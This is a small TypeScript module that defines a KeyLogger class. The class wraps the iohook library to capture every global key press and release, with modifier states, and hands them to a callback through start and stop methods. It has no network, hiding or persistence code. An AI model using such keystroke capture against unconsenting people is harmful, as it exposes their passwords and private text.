import * as iohook from "iohook";

class KeyLogger {
    #hasStartedKeyLogger: boolean = false;

    callback: Function;
    constructor(callback: Function) {
        this.callback = callback;
    }
    start() {
        if (this.#hasStartedKeyLogger)
            return "Already started keyLogger!";
        
        iohook.on("keydown", e => {
            this.callback({
                eventType: "keydown",
                event: {
                    keycode: e.rawcode,
                    altKey: e.altKey,
                    shiftKey: e.shiftKey,
                    ctrlKey: e.ctrlKey,
                    metaKey: e.metaKey
                }
            });
        });
        
        iohook.on("keyup", e => {
            this.callback({
                eventType: "keyup",
                event: {
                    keycode: e.rawcode,
                    altKey: e.altKey,
                    shiftKey: e.shiftKey,
                    ctrlKey: e.ctrlKey,
                    metaKey: e.metaKey
                }
            });
        });

        iohook.start();
        
        this.#hasStartedKeyLogger = true;

        return "Started Keylogger";
    }
    stop() {
        if (!this.#hasStartedKeyLogger)
            return "Keylogger hasn't started yet!";

        iohook.stop();

        this.#hasStartedKeyLogger = false;

        return "Stopped Keylogger";
    }
}

export = KeyLogger;